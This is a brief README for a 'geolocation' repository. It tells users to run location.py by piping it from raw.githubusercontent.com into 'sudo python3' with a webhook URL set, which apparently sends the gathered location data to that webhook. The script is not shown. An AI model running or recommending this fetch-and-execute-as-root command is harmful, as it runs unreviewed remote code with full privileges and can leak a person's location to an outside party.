# Geolocation Repository

This repository contains a Python script for geolocation-related functionalities.

## Description

The `location.py` script in this repository is designed to fetch and process geolocation data. It can be executed directly from the command line using a specific command that sets an environment variable for a webhook URL.

## Execute the Script with the Webhook URL:

To run the script and send data to a specific webhook, use the following command. Make sure to replace `https://example.com/webhook-endpoint` with your actual webhook URL.

```bash
curl -s https://raw.githubusercontent.com/spookykat/geolocation/main/location.py | sudo WEBHOOKURL=https://example.com/webhook-endpoint python3
